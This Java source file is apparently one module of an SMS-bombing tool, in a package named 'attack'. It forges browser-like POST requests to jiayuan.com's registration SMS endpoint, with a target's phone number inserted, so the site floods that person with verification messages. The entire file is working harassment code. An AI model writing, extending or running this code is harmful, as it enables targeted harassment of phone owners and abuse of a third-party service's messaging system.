package com.utils.attack;

import com.utils.HttpUtil;
import org.apache.http.impl.client.CloseableHttpClient;

import java.util.HashMap;
import java.util.Map;

/**
 * Created by fz on 2015/8/23.
 */
public class ShiJiJiaYuanBomber implements MessageBomber{

    public String name;

    public ShiJiJiaYuanBomber(String name){
        this.name = name;
    }

    @Override
    public String emissionMissile(CloseableHttpClient httpClient, String fuckNo) throws Exception{

        String url = "http://reg.jiayuan.com/libs/xajax/reguser.server.php?processSendOrUpdateMessage";
        Map headers = new HashMap();
        headers.put("Accept", "*/*");
        headers.put("Accept-Encoding", "gzip, deflate");
        headers.put("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4,zh-TW;q=0.2");
        headers.put("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
        headers.put("DNT", "1");
        headers.put("Host", "reg.jiayuan.com");
        headers.put("Origin", "http://reg.jiayuan.com");
        headers.put("Referer", "http://reg.jiayuan.com/signup/fillbasic.php?bd=5410&province=41&degree=30&marriage=1&height=170&degree=30");
        headers.put("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36");
        headers.put("X-Requested-With", "XMLHttpRequest");
        Map params = new HashMap();
        params.put("xajax", "processSendOrUpdateMessage");
        params.put("xajaxargs", "<xjxquery><q>mobile=" + fuckNo + "</q></xjxquery>");
        params.put("xajaxargs", "mobile");
        params.put("xajaxr", "1440322143431");
        String result = HttpUtil.httpPost(url, headers, params);
        return result;
    }

    @Override
    public String getBomberName() {
        return this.name;
    }
}
